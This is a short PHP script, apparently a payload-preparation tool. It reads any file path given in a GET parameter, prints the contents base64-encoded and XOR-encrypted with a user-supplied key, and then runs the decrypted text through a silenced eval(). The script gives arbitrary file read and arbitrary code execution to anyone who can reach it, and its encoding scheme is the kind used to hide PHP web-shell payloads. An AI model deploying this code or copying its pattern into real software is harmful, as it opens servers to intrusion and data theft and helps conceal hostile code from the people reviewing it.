<pre>
<?php
	if(isset($_GET['file'])){
		if(is_file($_GET['file'])){
			$compress = Array("\n", "\t", "  ", "{ ", "; ", ", ");	
			$good		 = Array(' ',  ' ',  ' ',  '{',  ';',   ',');			
			$file = file_get_contents($_GET['file']);
			$file = str_replace($compress, $good, $file);
			echo "BASE64\n";
			echo base64_encode($file);
			echo "\n---------\n";
			echo "CRYPTED BASE64\n";
			$file = cryptFile($file, $_GET['pass']);
			$file = base64_encode($file);
			echo $file;
			echo "\n---------\n";
			$file = base64_decode($file);
			echo cryptFile($file, $_GET['pass']);
			echo "\n---------\n";
			echo "EVAL\n";
			@eval(cryptFile($file, $_GET['pass']));			
		}
	}else{
		exit('no file');
	}
	
	function cryptFile($text, $key = '') {
    return (($text ^ str_pad("", strlen($text), $key)) & str_repeat("\x1f", strlen($text))) | ($text & str_repeat("\xe0", strlen($text)));
	}
?>
</pre>
